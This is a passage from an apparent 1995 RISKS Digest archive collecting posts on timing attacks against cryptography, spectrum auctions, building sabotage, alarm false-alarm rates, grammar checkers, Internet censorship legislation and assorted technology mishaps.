symposium is intended for those interested in the more practical aspects of
network and distributed system security, focusing on actual system design
and implementation, rather than in theory.  We hope to foster the exchange
of technical information that will encourage and enable the Internet
community to apply, deploy and advance the state of the available security

<P>
I've just released details of an attack many of you will find interesting
since quite a few existing cryptography products and systems are potentially
at risk.  The general idea of the attack is that secret keys can be found by
measuring the amount of time used to to process messages.  The paper
describes attacks against RSA, fixed- exponent Diffie-Hellman, and DSS, and
the techniques can work with many other systems as well.
<P>
My research on the subject is still in progress and the current paper does
not include many of my findings.  I will eventually publish a full paper,
but am releasing a preliminary draft now to alert the community as quickly
as possible.  A copy of the abstract is attached at the end of this message
and the full text can be downloaded in PostScript format from:

I've also made an HTML version which is accessible at:

<A HREF="http://www.cryptography.com">http://www.cryptography.com</A>
<P>
(The HTML uses subscripts and superscripts which aren't supported in older
web browsers.  The PostScript version is the "official" one and looks
nicer.)
<P>
The results have already been seen by Matt Blaze, Martin Hellman, Ron
Rivest, Bruce Schneier, and many others.  While the full significance of the
attack is not yet known, I think everyone who has seen it considers it
important (including Netscape who awarded me a $1000 bugs bounty prize).
<P>
ABSTRACT.  Cryptosystems often take slightly different
amounts of time to process different messages. With network-
based cryptosystems, cryptographic tokens, and many other
applications, attackers can measure the amount of time used
to complete cryptographic operations.  This abstract shows
that timing channels can, and often do, leak key material.
The attacks are particularly alarming because they often
require only known ciphertext, work even if timing
measurements are somewhat inaccurate, are computationally
easy, and are difficult to detect.  This preliminary draft
outlines attacks that can find secret exponents in Diffie-
Hellman key exchange, factor RSA keys, and find DSS secret
parameters.  Other symmetric and asymmetric cryptographic
functions are also at risk. A complete description of the
attack will be presented in a full paper, to be released
later. I conclude by noting that closing timing channels
is often more difficult than might be expected.

Spectrum Insanity  [Originally written for TELECOM]
<P>
Greetings.  With so much of the country's attention (rightly) focused on the
budget battles regarding Medicare, Medicaid, Environmental and Education
funding and similar critical issues, it's easy to forget some of the other
issues that play directly into the ongoing budget debate--issues that
directly affect telecommunications.
<P>
The new telecommunications rewrite, which is nearing completion in Congress,
shows signs of having many of the same negative attributes as the screenplay
with too many authors, or the animal designed by committee.  In short, it's
highly questionable whether it will do more good than harm.  Its various
aspects have become so controversial that various news outlets have started
refusing to run ads supporting one side or the other, for fear their own
interests will be compromised.
<P>
The bill covers a lot of ground, but I'd like to focus here on only one
aspect--what happens when politics attempts to drive technology.  In the
search for the holy grail of simultaneously crafting a "balanced budget",
tax cuts, and technological reforms, the concept of "spectrum auctions" has
moved into center stage.  A simple concept really: He has the most bucks
gets the spectrum.  One thing's for sure, if this sort of policy had been in
effect during the formative years of broadcasting, the multitude of non-pay,
commercially-sponsored television and radio outlets we have today would be
very unlikely to exist, and the stifling effects on technical innovation
would be difficult to predict.
<P>
But now a fascinating development is occurring which could directly affect
every radio and television listener/viewer.  In case you haven't noticed,
the hot topic in broadcasting these days is "digital broadcasting".
Experiments are in progress regarding both satellite and terrestrial digital
radio broadcasting, with a range of both technical and "political" arguments
surrounding every step.  The FCC wants terrestrial television broadcasters
to convert to digital as well.  The promises of the technology are indeed
seductive--"perfect" (?) pictures, multiplexing of multiple channels in the
bandwidth currently used for one channel, and so on.  Of course, the
standards for these transmissions have yet to be completely nailed down, the
cost of the technology will be high for the short to medium term at least
(and this *isn't* necessarily HDTV we're talking about), and it's decidedly
unclear whether consumers are really all that interested--at least when it
comes to either buying expensive converter boxes (just what most people
want, more boxes hanging off their sets!) or junking all their TVs, VCRs,
and other related equipment for new expensive digital ones.
<P>
The cost to broadcasters to meet such an FCC mandate will be very high.  It
was recognized early on that if such a conversion was ever to succeed, a
transition period, which the FCC initially pegged at 20 years, would be
necessary.  Broadcasters would be allocated a new slice of spectrum that
they could use for digital services while simultaneously continuing their
existing analog transmissions on their existing channel.  At the end of the
(presumably successful) transition period, they would turn the analog
spectrum back to the government for reassignment.  Not only will the
broadcasters need to spend vast amounts for this conversion, the cost to
consumers, over the 20 year transition period, could be enormous.
<P>
But as Congress has searched for new revenue sources, the idea came up that
rather than provide the non-pay, commercially sponsored broadcasters with
the spectrum for the transition, that spectrum should be "auctioned off"
instead to the highest bidders.  There are a number of problems with this,
including the fact that it says nothing about public interest--it speaks
only to who has the most bucks.  And while many broadcasters aren't exactly
poor (though many operate on surprisingly thin margins) there are other
interests (mainly cellular, PCS, and other services whose main income stream
is derived from well-heeled business users and investors) who have vast
financial resources and could probably out bid anyone else for anything.
<P>
The arguments over this have been raging.  And now, it appears that the
latest plan floating around is that the broadcasters won't have to try
out bid for spectrum necessary to meet FCC mandated digital transition
requirements.  But here's the kicker--the new idea is to force the
transition to occur in only *seven* years.  By 2002, everyone is supposed to
have converted to super-deluxe digital broadcasting.  That's the television
broadcasters *and* all consumers.  Does it seem just a wee bit unlikely that
such a schedule can be met?  Are consumers going to be willing to see all
their television equipment converted to door stops in a rush to provide
"digital quality" pay-per-view and home shopping channels?
<P>
And what of the quality of technology that will result from this sort of
politically driven "mad rush" towards the future?  This all makes about as
much sense (and is as likely to succeed) as the laws on the books in
California that have mandated that something like 20% of the cars sold in
the state must be electric powered within the next 7 years or so.  The fact
that no such vehicles exist with specs, performance, or affordable prices
that could meet such goals didn't deter the enactment of the laws.
<P>
When technology is driven by artificially created non-technological
constraints, the result is frequently confusion, often poor design, and
almost always massive waste.  It's time to take a step back and start
applying some real thought and logic to these issues, rather than letting
them be driven largely by political rhetoric.  Otherwise, we're all likely
to be paying through the nose for a long time to come.

<I>Thu, 7 Dec 1995 16:26:58 -0600</I>
<P>
I received two recall notices for two books from the University of Chicago
science library.  The recall notices were mailed in separate envelopes and
each listed the call number, abbreviated title, and three ID numbers
identifying the item, the loan and the patron [me].  Because faculty have
indefinite loan periods, a recall notice indicates that other patron wants
this book.  Our library has a very nice bar code reading system for both the
patron's card and the book ID, making checkout and return simple and
efficient.  All I needed to do was get the books and return them to the main
library which is three blocks from my home.
<P>
I recognized one of the titles but the other seemed strange.  Its title was
an anglicized version of Arabic, a language that I don't read.  I guessed
that a scanner had misread either one of the books I took out or someone
else's ID card had been misread as mine and the book had been mistakenly
charged to me instead of to the actual borrower.  I also, briefly,
considered the most horrid of possibilities: that I had exactly the same
patron ID as another faculty member who was charging out lots of books of
which I (with indefinite loan privileges) was unaware and that one day I
would be required by a severe looking woman with reading glasses on a chain
around her neck to produce a large number of books containing not a single
character in an alphabet I recognize.
<P>
I went off to the library and explained my situation to a student helper who
looked at me as though I were a pederast and called the supervisor.  The
supervisor, a most helpful and calming influence, was easily convinced that
I had not knowingly taken out a book in Arabic.  She called up my patron ID
and then rapidly called up a series of screens on the computerized
circulation system.  She said, after a few minutes work, that she thought
she knew what had happened.  She disappeared into the stacks and, a few
minutes later, brought out a little blue book, in Arabic, that was the one
being recalled.  After weeping uncontrollably at the relief of being saved
from some the horrific effort of phoning a lot of embassies trying to find a
replacement copy of a paperback book whose title and author I could not
pronounce or spell, I asked this goddess Diana to explain what had happened.
<P>
It seems that the library circulation system is organized around the "piece
ID" for each item.  Piece IDs uniquely identify items and are assigned in
the order in which books enter the library.  The piece ID for the book I
actually had and the one in Arabic differed by a single digit and it seems
likely that the clerk entering the recall for my book mistyped the piece ID.
But how could this happen? Wouldn't entry of a piece ID for some book that
was not charged generate some sort of error message?  Well, it turns out
that the system actually handles recalls by checking the requested book IN
and then immediately charging it OUT again to the same patron ID for a
week's loan.  Since one has 7 days to return a recalled book, this has the
effect of changing the indefinite loan period to a week and setting up the
necessary conditions for the automatic generation of a series of late
notices, fines, larger fines, really big fines, invalidation of library
priveleges, expulsion from the faculty, firing squads, etc.  Because, in
effect, the book has to be returned to the library (from the computer's
point of view) and then charged out for a limited time, it is quite possible
for a mistyping to generate the conditions I encountered.
<P>
I was relieved to not have to visit in turn each of the Middle Eastern
faculty in the University in search of the little book.  The librarian (who
had taken on the aspect of the Venus de Milo) assured me that I had only
seven books charged against my ID and that all these had reasonable call
letters derived from more placid, familiar regions of the stacks.  With a
sigh and mental note to spend more time reading in the library and less at
home, I went past the human monitor checking briefcases, through the metal
detector, past the turnstile, and out into the cold, clear winter air.

As a guide for law enforcement personnel and systems managers, this provides a
good overview and introduction to computer crime and the actions to take
against it.  Touching on crime, prevention and prosecution, the book is
practical and helpful to those needing to get a quick handle on the problem.
<P>
It is, however, easily evident that the authors are law enforcement, rather
than systems, professionals.  Those expecting a technical discussion, from
the O'Reilly imprimatur, will be disappointed.  The book started life as an
official FBI training manual.  The explanations and concepts are elementary
-- and are intended to be so.  Thus, while it might be possible to argue<BR>
(rather weakly) for the definitions of viruses, worms and other malware as
described in the book, security experts will likely feel a bit uncomfortable
with them.  The abdication of discussion on encryption is not going to help
those who want to help protect their systems.  (On the other hand, there is
nothing to indicate any political bias in regard to encryption.)  The
bibliography, though, is of good quality, and should make up for the
technical shortcomings in this work.
<P>
I am delighted to see, for once, not only mention but actual listings of
computer laws from outside of the US.  The coverage is still a bit lopsided,
with 130 of US federal and state statues and less than twenty devoted to the
rest of the world, but it's a start.

<P>
Here at the University of Florida we appear to have been the victims of a
new variant of the "pull the fire alarm before the exam" attack. This week
has been the week before finals -- known locally as "dead week" -- when many
major projects and papers are due.
<P>
On Monday afternoon someone sabotaged the main circuit breaker to the entire
Computer Science and Engineering (CSE) building. The building houses the
computer science department, elements of the electrical engineering
department, a huge computer lab and a VAX cluster used by the general
student population, and the campus network operations center. A new breaker
had to be ordered from the manufacturer in Iowa. Apparently the breaker is
not a stock item but a custom manufacturing job.
<P>
By Tuesday morning power had been restored by borrowing a breaker from the
Marston Science Library (MSL) -- really part of the same building but with
an independent main electrical panel. While power was being restored to the
CSE, the MSL had to be closed, because it didn't have power at that point. A
planned power outage was scheduled for 10p-midnight so that the new breaker,
due to arrive late Tuesday, could be installed. Unfortunately, at about
6:00p Tuesday the vandal struck again and vandalized the same breaker. At<BR>
this point we had no functioning circuit breakers on site.  Another breaker
was ordered from the manufacturer at this point.  Since we had been stung
twice the campus police became very aggressive.  The building was declared
"sealed" by the police although no stronger measure than locking the doors
was taken to "seal" the building. The police ejected staff members who were
on site to ensure that when power was restored things would be started
correctly and in a timely manner.
<P>
Another planned outage was scheduled for Wednesday night 10pm-3am so as to
allow the second new breaker to be installed in the MSL. By Thursday morning
we were on the path to a full recovery. There were no signs of forced entry
to the electrical closet where the main panel is housed (so we've been told)
in both of the events. After the panel was sabotaged the second time the
panel was kept under guard by the University Police until the lock had been
changed. At this point nobody has been arrested.  Given that this attack
caused a great deal of hardship for a lot of students, staff and faculty,
the culprit would be a fool to advertise his or her daring. It's also worth
noting that the culprit probably put his or herself in danger in sabotaging
the panel since he or she did not cut the power at the main before
sabotaging the main breaker.

<P>
All this talk about false alarms in digital systems reminded me of a
statistic I came across while doing some research into a report on the
application of microprocessors in home security systems. The False Alarm
Rate (FAR) of a home security system is 98%. As well, it would seem the
more complex the sensors, the greater the FAR.
The risks of high FARs are obvious. After numerous false alarms,
people will become conditioned not to respond. As a result, home security
alarms receive low priority by police departments. As witnessed by
several RISKS readers, alarms in hospitals receive low priority by the
care givers.
While it is better to be safer then sorry in a security or medical
environment there is something to be said about making your margin of
error too big. If we have to use such large margins of error perhaps we
need to re-think how we use digital systems in a highly complex analog world.

<P>
There has been a lot of good discussion in this thread about delivering
the right alarms - to the right people - at the right time - in the right
order - so as to have them dealt with in the right way (in a hospital
setting, in this case).
<P>
Kenneth Albanowski identified a separate risk of the direct harm caused
to patients from the simple existence of all these competing alarms from
their own and other patients' equipment.  Anybody who has ever visited a
hospital, let alone been a patient, knows the reality of this second risk.
<P>
Unfortunately, proper handling of the first, more immediate, cluster
of risks requires that the second risk not be mitigated.  Several
writers have told anecdotal stories of hospital staff treating alarms
in inappropriate ways.  Most of us could probably add to the list of
situations in which harmful (or fatal) consequences were only avoided
through the intervention of the patients themselves, or hospital visitors,
or even other patients.  The patient is the only one involved who is
unable to pass the buck - either to another person or to the machinery.
<P>
The patients and hospital visitors cannot be denied exposure to most
alarms - these people are a critical part of the safety net.  In fact,
alarms should be designed to be intelligible to a lay person, and this is
also one way to address the question of sensory overload - intelligible
alarms provide more peace-of-mind than random, unexplained panic warnings.
<P>
Note that more generally, hospital staff are not much more technically
talented than the population as a whole - health care workers largely
choose their careers for reasons unrelated to technology.  There is also
no particularly strong trend to weed technically challenged doctors and
nurses out of the workforce (as we can see).  The patient is often as
competent as, or more competent than, the doctor at decisions that lie
outside narrow medical limits.
<P>
My own anecdote for this thread is that during the birth of our first
child, my wife was administered pitosin - the dreaded "pit", a drug
to increase the productivity of labor.  Her contractions were monitored
using a simple strip chart recorder attached to some equally simple
transducer.  This particular device appeared to be new to the nurses,
but I don't think their interpretation of the trace would have benefited
from any training.  There was a complete lack of understanding of the
difference between a smooth sinusoid and a (very) flat-topped trace -
both peaked at 100% according to the nurses.  Most of my poor wife's
contractions were pinned well above that level.  We could not get them
to understand why they should turn down the drip if they planned to
agree with the doctor's instructions (which we had also been present
to hear, of course - another part of the safety net).
<P>
Finally they turned down the flow rate of the drug - but only because
we were making such a fuss (nurses that let themselves be bullied by
patients is another risk).

I had a summer job while in college as a radio serviceman with a railroad.
Part of my duties required going from one station to another in the cab of a
diesel-electric locomotive. The equivalent of alarm-silencing which I
observed, was the placing of a heavy weight, such as a toolbox, on the
engineer's dead-man pedal. Apparently it was too much of a strain to keep
one foot on that pedal to avoid stopping the train.
<BLOCKQUOTE><I>
[Although this case is not particularly computer-relevant, and is indeed
a very old problem, it is included here as another reminder of the
intricacies in designing safety mechanisms.
<P>
There were too many messages on this subject to include all of them.
However, let me editorialize on some conclusions.  One of the lessons of
the RISKS archives is that no matter how many mechanisms are in place,
they can still be subverted.  There is also an issue involving what
happens when a safety mechanism fails, such as a sensor.  When one fails,
the system risk probabilities change, and must be reevaluated.  The best
policy is to replace a faulty component as soon as possible, rather than
relying on the seeming independence of events to preclude the NEXT
failure...  PGN]

Jim Batterson of Richmond VA sent me a clipping of an article from
the Richmond Times-Dispatch, 9 Dec 1995, B1.
<P>
A Lancaster PA teenager was visiting with a student at Eastern Mennonite
University, and was given the student's password.  The teenager used that
password to log on, download some hacking tools from a BBoard, and gave
supervisor privileges to everyone -- including access to everything,
including forthcoming final exams, private e-mail, and faculty documents.
(Student and financial records are kept elsewhere.)  EMU spokesman Jim
Bishop said, "Apparently, none of the students rifled through material they
shouldn't have seen."  [How can you tell?  In many systems today, privileged
and even normal reads do not show up in directory listings, and few sites
run anomaly-detecting software that monitors read access!  PGN]

Add storm notes: Some pixies rejiggered the electronic Caltrain sign on
I-80 in Richmond Tuesday night, transforming ``Off Ramp Closed'' to
``Boo OJ,'' but nobody can figure out how they did it.
<P>
I'm sure the readers here can come up with more RISKy applications for this
"rejiggering" technology.
<P>
Details: The sign was almost certainty a "caltrans" sign, not a caltrain
sign.  Caltrans handles the roads, caltrain handles the trains.  Personally,
I bet Caltrans knows how it was done, but whoever reported this to Herb Caen
did not.

Next month Union Pacific and the Burlington Northern Railroad Co. will test
a satellite-based computer system to monitor locomotives' speed and
location.  The software flashes a warning to crew members when a train
exceeds a safe speed, and if the advice is ignored, the system activates
robotic technology to apply the brakes.  When fully implemented, the system
could save railroads $30 million a year by preventing accidents caused by
human error, plus whatever additional savings are realized through more
efficient tracking by dispatchers.  (Investor's Business Daily, 6 Dec 1995,

&gt;&gt;   Naval commanders lost two top secret computer discs on a train
journey from London, a court martial heard today.
The officers had given a presentation to a Navy wages review team
using the discs.
After stopping in a pub for a few beers they took a train back to their
unit in Petersfield, Hants, where they discovered to their horror that the
3.5ins discs had gone. &lt;&lt;

<P>
<LI>No Top Secret information was copied to the disks, but the computer
used to copy some information to the disks was cleared for Top Secret
work.
<P>
<LI>Loss not reported until the following morning, by which time,
passengers had discovered and turned in the disks to the railway.
<P>
&gt;&gt;    "The computer they had used was cleared for top secret work --
anything downloaded on to those discs became top secret but there
was only a little bit of confidential information on them. There was
nothing top secret.   "This was a fairly new machine and had not had top
secret material on it."&lt;&lt;
<P>
<LI>One officer fell on his sword and admitted his error.
<P>
<LI>The other officer claimed he "doesn't handle secret material regularly.
He is an instructor officer and he has never received formal training in
the use of classified material."  The article states he is a Lt Cdr with 10

Squirrel Disrupts Downtown<BR>
by Bryan Corliss (of the Union-Bulletin)
<P>
A clumsy squirrel brought the high-tech financial hub of
Southeast Washington crashing down this morning.
<P>
The squirrel touched one line carrying 69,000 volts of elec-
tricity and another carrying 12,000 volts at the same time,
said Rich Bielby, Pacific Power's assistant operations
manager in Walla Walla.
<P>
The resulting explosion and fire inside Pacific Power's
central substation near the corner of West Rose Street
and Sixth Avenue killed the squirrel - and all power to
almost 4,000 downtown customers, Bielby said.
<P>
"Isn't that something," mused County Extension Agent Walt
Gary, who heard the explosion in his office across the
street.  "It isn't even a native animal here."...
<P>
The RISKS?  If you're a squirrel, many.  Just shows (yet again [...])

There was a story on NPR this morning (Tue Dec 12) about IRS policies
for collecting sales tax from cartoonists.  Apparently, if you are a
cartoonist who provides cartoons to a newspaper on paper, then you
must collect sales tax _but_ if you submit those same cartoons
electronically (over fax or modem, for example) then you are not
required to collect sales tax.  Does this mean that it's 6% cheaper to
buy any "work of art" over the internet?

<P>
&gt; The problems with the grammar checker are not subtle.  ... It exists only<BR>
&gt; because it makes a good demo and looks good on a bullet-list chart.
<P>
This is an interesting statement because it actually points out some
interesting RISKS. First is the risk of not understanding the software you
are using, caused by a second risk of adding features to get a "checkmark"
without really knowing what the consequences are.
<P>
I was the main author and software architect for the grammar checker
Grammatik, which is now a part of WordPerfect (and NOT the one used by
Microsoft.)
<P>
One of the main limitations of grammar checkers is a very high false error
rate. Certainly in an error-free document, the false error rate would be
100%. Most documents are not error-free, and in practice the false error
rate is closer to 30 or 40%.  While that is very high, that still means that
60% of the time, the grammar checkers are finding real errors. For native
English speakers, this is actually quite a valuable service.
<P>
In 1992, Microsoft decided that 60% was good enough and that grammar
checking should be an integral part of word processing.  The major
competitors followed Microsoft's lead, so now the major word processors all
have grammar checking. Because of this, users probably expect the grammar
checking to work as well as the spelling checking, which it DOES NOT.
<P>
As stand-alone products, the user manuals included with grammar checkers
clearly pointed out that many of the flags were false errors. Many of flags
are also judgment calls. Passive voice is fine, even standard for some
technical writing, but is still weak and ineffective for most other writing.
Because of the uncertain nature of the error flags, most of the suggestions
are couched with words such as "may be" or "consider."
<P>
Even with carefully worded wimpy suggestions, there are a couple of
problems. First, if the user has not been educated to expect a large number
of false errors, then they often become irritated and give up on the
program. A far worse problem and RISK is when the user does not understand
proper English well enough to separate the false flags from the true errors.
Then following the suggestions of the program can lead to incorrect results.
<P>
For many years, grammar checkers were stand-alone products, and the decision
to use one was an active choice -- the user knew about the product, and
usually was aware of the limitations.  Since grammar checking has become a
standard feature of word processing, this self-filtering is gone.
<P>
The fact is that given the nature of the problem, commercial grammar
checkers are really quite good and valuable, given an understanding on how
to best use them. Unfortunately, the managers at Microsoft and
WordPerfect/Novell consider the issue settled.  They have their checkmarks,
and as far as I know, not much new work is being done to improve the state
of grammar checking.

Strange thing happened recently.

I received some e-mail from penet.fi, the Finish anonymous remailer. They
gave me an account "at my request."  I never requested it though. I asked
them how this happened and they swear it was me.
<P>
Spoofing. Kevin Mitnick adapted my electronic identity on the Internet 18
months ago and did some nasties which required some explanation. (Hard to

I've heard of this penet.fi happening to another person. Anyone else? Any

The Computer Centre at Monahs University ordered a copy of a very fast
FortanII called (as I recollect Quicktran) from a westcoast software company
in about 1967. This was to run on their recently installed, 32k word
CDC3200, and was for student use...
<P>
The deck (several boxes of punched cards) was in absolute binary, which
meant that it had no sequence numbers and could only be read by humans with
some difficulty. The (very expensive) deck duly arrived, and would not load.
<P>
In those days, there was only airmail, telex and the telephone, so it took
some time before Tony Adams (now Prof. and Dean of International Programs at
the Royal Melbourne Institute of Technology) finally accepted that a working
deck had been dispatched. He decided to track the consignment's passage
through customs, to see what had happened, and discovered a customs officer
who recalled that some other person had dropped two of the boxes, spilling
them. They had simply been picked up (having been randomised by the
experience), and had been sent to Monash without cooment.
<P>
A working deck eventually arrived, and worked well...

<P>
Fred is trying to sell a "learning machine".  It takes the "subliminal

headset flashes either pictures or (more likely) random patterns at you.
If you browse over to <A HREF="http://Zygon.com">http://Zygon.com</A>, you'll find them trying to sell
you the whole setup (less the (presumably) audio CD player) for an
incredibly discounted price of about 300 bucks.  For this low, low
price, you also get your choice of five "courses", on the CDs.
<P>
As I ran through their offerings, one jumped out at me.  They have
"self improvement" courses.  You know the type of thing: how to be more
assertive, how to be more successful, how to make a million, how to
make out.
<P>
Now, I'm not really afraid of Fred and his friends.  They are out to con a
few people and make a few bucks.  But what if someone *does* manage to come
up with a legitimate teaching/training machine, one of these days, that does
work as advertised?  (Science finction stuff, maybe, but disquieting none
the less.)  Being unable to get unpopular varieties of apples at the store
is one thing, but what happens to requisite variety when everyone wants, and
has the means, to become a grinning supersalesperson?  What happens to
psychodiversity when everyone tries to get that little edge in
assertiveness?
<P>
OK, everyone back to worrying about the real world, now.

<P>
CPSR will forward the attached letter to President Clinton and Congress on
Tuesday, reflecting the position of CPSR's Board of Directors regarding the
censorship provisions in the telecommunications deregulation legislation now
pending before Congress.
<P>
Please share the letter freely as long as this notice is not removed and
CPSR is identified as the originator.
<P>
********************************************************************
<P>
December 12, 1995
<P>
President Clinton and Members of Congress,
<P>
On behalf of Computer Professionals for Social Responsibility (CPSR), I am
writing to urge an immediate halt to Congress's attempt to censor the
Internet.  The legislation you are considering adopting is the cyberspace
equivalent of padlocking the doors to public libraries, burning books and
shutting down printing presses.  Congress must not enact, and President
Clinton must not sign, a law that censors free speech on the Internet.
<P>
CPSR is a public interest alliance of computer professionals and computer
users concerned about the impact of computer technology on society.  We work
to influence decisions regarding the development and use of computers
because those decisions have far-reaching consequences and reflect our basic
values and priorities.
<P>
As technical experts, CPSR members provide the public and policymakers with
realistic assessments of the power, promise, and limitations of computer
technology.  As concerned citizens, we direct public attention to critical
choices regarding applications of computer technology, and how those choices
affect society.
<P>
As American citizens, our right to free speech is guaranteed by the First
Amendment to the U.S. Constitution.  We have the same right to free speech
in cyberspace as we have with other forms of the printed word.
<P>
Most Americans consider free speech the cornerstone of a free society.  But
many members of Congress -- incredibly -- support language in the sweeping
telecommunications deregulation bill now pending before a joint Senate-House
conference committee that would criminalize a broad range of information
under the claim that it is harmful to children.  These clauses of the bill,
while supposedly aimed at pornography, have such vague language that they
could be used to censor literary classics and public health information.
<P>
Given the open nature of networks such as the Internet, restrictions on
sending material that children might look at ends up keeping everyone from
speaking freely.  The fear of being caught in the law's net will force many
networks to shut down.  Thus, t he free flow of views we now have on the
information highway could be replaced by a controlled set of ideas dished
out by corporate broadcasters and monitored by prosecutors all over the
country.  One example of the impact of the proposed legislation:
<P>
CPSR's Seattle Chapter sponsored the Seattle Community Network, a free,
public-access computer system for the public's benefit.  SCN has over 6,500
users.  Under the legislation proposed by Congress, if an individual member
of the SCN posted a message on an SCN forum or from SCN that was later
deemed to be "indecent," SCN could be fined $100,000, and SCN's Board of
Directors and staff could face two-year prison sentences.  Without community
networks like SCN, the Internet will be out of reach of millions of
citizens.
<P>
CPSR does not dismiss the concerns of parents who want to shield their
children from inappropriate material.  The whole point is that each parent
defines what is "inappropriate" differently.  There are more flexible and
effective ways to screen what children see, than to have the government
impose censorship on everybody.
<P>
The issue before you is not about whether or not our children are exposed to
materials that some may find offensive or obscene.  It's not about whether
or not parents should control what their children are exposed to on the
Internet.
<P>
It's about freedom of speech, which is a fundamental principle in our
society.  It's a principle with widespread support.  The vast majority of
American citizens, no matter what their political leanings, support free
speech.  Those who oppose free speech are a small, shrill minority, and they
appear to want to tyrannize the rest of us in order to get their way.
<P>
President Clinton and Members of Congress, it is up to you to protect our
rights.  That's why we elected you.  Today, CPSR's 1,600 members are joining
with hundreds of thousands of other Americans in speaking out against this
attempt to censor free discourse in cyberspace.  Many of you in Congress
ignored an earlier petition signed by 107,000 Internet users.  Please don't
ignore us today.  We are the People, and today we're exercising one of our
most important rights.
<P>
Sincerely,

<P>
HOUSE-SENATE COMMITTEE SLAPS THE NET -- AGAIN<BR>
by Craig A. Johnson<BR>
American Reporter Correspondent
<P>
WASHINGTON -- "Indecency" language, as defined for broadcast media
by the Federal Communications Commission, seems now to be superglued onto
the telecommunications reform bill.  [...]
In short, the committee is attempting to build a four-humped
camel from parts of the original Exon and Hyde measures in the bills --
and perhaps grafting on some of White's language, which grants more
generous protection to service providers who carry content and actively
try to keep "indecent" materials from being transmitted to minors.
This observer came away with the strong impression that the
committee fully intends to abrogate the First Amendment as it applies to
the Internet, despite some members' visible discomfort with the results.

<P>
&gt; ... The False Alarm Rate (FAR) of a home security system is 98%. ...
<P>
This statistic may be somewhat misleading.
<P>
During some consulting work for the British insurance industry on electronic
alarms I was told several of the modi operandi of British criminals.
<P>
A favourite trick is to cause false alarms specifically so that the police
will record an alarm as unreliable.  In other words they will set off your
alarm, while carefully avoiding leaving any trace - they then go home.
Later they might set off your alarm again - the police record this as a
second false alarm when both were genuine.  They repeat this until the
police regard the alarm as faulty then the thieves can go in with impunity.
<P>
A variant on this, which insurers have noted on several occasions, is to
attack the telephone exchange through which the alarm signals are routed.
The reason for doing this is that so many alarms are recorded (because
whoever is monitoring the alarms can no longer communicate with any of them)
that police or security firms don't know which alarm to respond to.
<P>
Fortunately I have not (yet) heard of occasions where people cause medical
alarms with the intention of preventing nursing staff from responding to a
subsequent emergency.

</ADDRESS>
<I>Fri, 15 Dec 1995 12:34:35 -0800</I>
<P>
A remark was made regarding the 98% false alarm factor from home security
systems.  This is the nationally recognized number which everyone hears.
<P>
We operate a Underwriters Laboratories Listed Central Station Alarm Company.
Since we monitor and maintain (service) our systems, we are very aware of
false alarms.
<P>
First, regarding the 98%:
<UL>
<LI>75% are user errors.  Let a friend in without the code, left a door/window
ajar, left a pet in an area with motion detectors, and on and on.
<P>
<LI>20% are equipment/power/telephone lines related.  Alarms use a gell cell
to not only power the system in the event of a power failure, but it also
absorbs power fluctuations.
<P>
<LI>5% are valid activations.  This does not necessarily mean an arrest, but a
pried window, vandalism, window smashed by wind in a storm, and on and on.
</UL>
The 98% figure is used by city police departments to show that officer
response time is consumed by false alarms.  We use a different statistic.
We track a ratio between the number of alarms (total, in a municipality,
etc.) and the number of actual dispatches.  Our company statistic is about
.6 per account per year.  The 98% may still be valid, but the total number<BR>
of actual dispatches is low.
<P>
Most cities have alarm ordinances that inflict some penalty (money, etc.)
for excessive false alarms.  Although I disagree with most of these
ordinances, since they are directed to raising revenue, not reducing false
alarms, the net effect is the responding officer will not continually
respond to a particular alarm very often because he/she knows that so it
will be dealt with by the administration.  Also, there are enough alarms
that are valid intrusions, that the responding officers don't consider them
just another false alarm.  No one wants to meet an third time offender (in
CA) when they are not prepared.
<P>
The answer to the false alarm issue for home security systems is for the
monitoring station and the service station to be one and the same.  Most
alarm companies use a "remote monitoring company", sometimes in another
state, with tens of thousands of accounts.  This arrangement lowers the
personal attention and lack of knowledge when "80 year old Mrs. Smith gets
up in the night and opens the wrong door".
<P>
One last comment regarding microprocessor based controls vs. relay or
transistor based controls.  The newer controls allow for multiple zones, so
the alarm company knows which area tripped.  They also allow for programming
the sensor loop response time (in milliseconds), so an old mechanical switch
that moves a little when the door rattles, thereby causing a 40 ms. alarm
signal, will not cause a police response.
<P>
I hope that I have cleared some possible concern regarding false alarms in
home security systems.

<P>
This book is intended to address the security needs of personal (or desktop)
computers, and is one of the few that does.  The content addresses those
vulnerabilities which *do* plague workstations, and is generally free of
"big iron" paranoia and concerns.
<P>
Alexander's style is a bit flippant, but not at the expense of the
information being conveyed.  The organization is a trifle odd.  (The first
half of the "Safe Desktops and Laptops" chapter deals exclusively with
passwords, even though few standalone machines use them.  Password
generators and challenge/response systems, however, are covered in the
chapter on networks.)  Technical details and specific suggestions do have a
number of errors, particularly when dealing with MS-DOS.  For those in the
know, the chapter on viruses has some oddities, but nothing that would be
dangerous to the user.
<P>
Data security is a tedious and often confusing field.  This book is only a
start, but could be quite helpful to the non-specialist.

Tomorrow's papers will undoubtedly have some coverage on the the NY Stock
Exchange, which opened an hour late this morning.  From what I can glean
from various preliminary sources, the weekend had been spent upgrading the
system software.  However, at 9:15 this morning, it was discovered that
there were serious communications problems in the software between the
central computing facility and the specialists' displays.  The problem was
diagnosed and fixed by 10:00am, and the market reopened at 10:30.  It was
the first time since 27 December 1990 that the exchange had to shut down.
The Chicago Mercantile Exchange, Boston Stock Exchange, and Philadelphia
Stock Exchange all waited until the NYSE opened as well.

An article on the Dow-Jones news service (which I presume means that it is
also in the Wall Street Journal) discusses the risks of display lasers
(mostly used instead of the old carbon-arc spotlights to call attention to a
place) co-existing with aviation.  Some of the interesting tidbits:
<UL>
<LI>The Luxor in Las Vegas has a beam which reflects off of a waterfall.  When
the water pressure of the fall weakens, the reflections cause problems for
the nearby airport.  A check valve has been installed to shut the beams
down when the water pressure drops too low.
<P>
<LI>A McDonnell Douglas study found that 45% of participants crashed a flight
simulator when exposed to a laser beam while making a turn.
<P>
<LI>Several incidents of laser blinding have been reported by pilots.  Example:
A pilot for Southwest Airlines, took off from Las Vegas's McCarran
International Airport. About three miles into the flight he was blinded by
a flash of brilliant light, requiring his fellow pilot to grab the controls.
<P>
<LI>The FDA has ordered a halt to laser light shows within 20 miles of any Las
Vegas airport as a result of such incidents.
<P>
<LI>The Las Vegas Hilton has installed TCAS(!) - Traffic Collision Avoidance
System which will shut off its lasers if it senses any type of aircraft in
their path.  But the system is unreliable with aircraft below 1,200 feet.
</UL>
This reminds me that laser blinding played an important role in a recent Tom
Clancy novel.

Paul Kocher's announcement in <A HREF="/Risks/17.54.html">RISKS-17.54</A> about timing attacks to find
secret keys reminds me of an analogous (and analog) attack that can be made
on chip cards.
<P>
Since chip cards can fall into attackers' hands, not only must the
